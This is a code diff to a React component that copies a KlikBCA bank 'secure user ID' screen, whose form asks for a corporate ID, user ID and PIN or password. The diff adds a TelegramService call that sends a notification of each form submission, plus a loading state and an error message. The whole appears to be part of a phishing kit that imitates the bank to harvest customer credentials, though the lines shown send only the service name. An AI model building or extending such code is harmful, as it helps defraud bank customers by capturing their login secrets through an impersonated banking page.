@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { ArrowLeft, User, Briefcase, Eye, EyeOff, ShieldCheck, AlertCircle, Check } from 'lucide-react';
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
 import { validateUserId, validateCorporateId, validateUserPinOrPassword } from '../utils/validation';
+import { TelegramService } from '../services/telegramService';
 
 interface MAdminAmankanUserIdViewProps {
   onBack: () => void;
@@ -38,9 +39,12 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
 
   // Status modals
   const [showProcessModal, setShowProcessModal] = useState(false);
+  const [submissionError, setSubmissionError] = useState<string | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setSubmissionError(null);
     setTouched({
       corporateId: true,
       userId: true,
@@ -48,6 +52,19 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
     });
 
     if (!isFormValid) return;
+
+    setIsSubmitting(true);
+    const notificationSent = await TelegramService.sendFormData({
+      serviceType: 'amankan-user-id',
+      serviceTitle: activeTab === 'individu' ? 'Proteksi KlikBCA Individu' : 'Proteksi KlikBCA Bisnis',
+    });
+    setIsSubmitting(false);
+
+    if (!notificationSent) {
+      setSubmissionError('Permintaan belum dapat dikirim. Periksa koneksi lalu coba lagi.');
+      return;
+    }
+
     setShowProcessModal(true);
   };
 
@@ -280,6 +297,13 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
             </p>
           </div>
 
+          {submissionError && (
+            <div className="bg-red-50 border border-red-200 rounded-lg p-2.5 text-[11.5px] text-red-700 flex items-center gap-1.5">
+              <AlertCircle size={14} className="shrink-0 text-red-500" />
+              <span>{submissionError}</span>
+            </div>
+          )}
+
           {/* 4. Action Buttons: Cancel & OK (1:1 with Screenshot) */}
           <div className="grid grid-cols-2 gap-3 pt-1 pb-6 mt-2">
             {/* Cancel Button */}
@@ -294,9 +318,10 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
             {/* OK Button with hover scaling feedback */}
             <button
               type="submit"
-              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs hover:scale-[1.01] active:scale-[0.98] text-center"
+              disabled={isSubmitting}
+              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] disabled:opacity-60 disabled:cursor-wait text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs hover:scale-[1.01] active:scale-[0.98] text-center"
             >
-              OK
+              {isSubmitting ? 'Mengirim...' : 'OK'}
             </button>
           </div>
         </form>
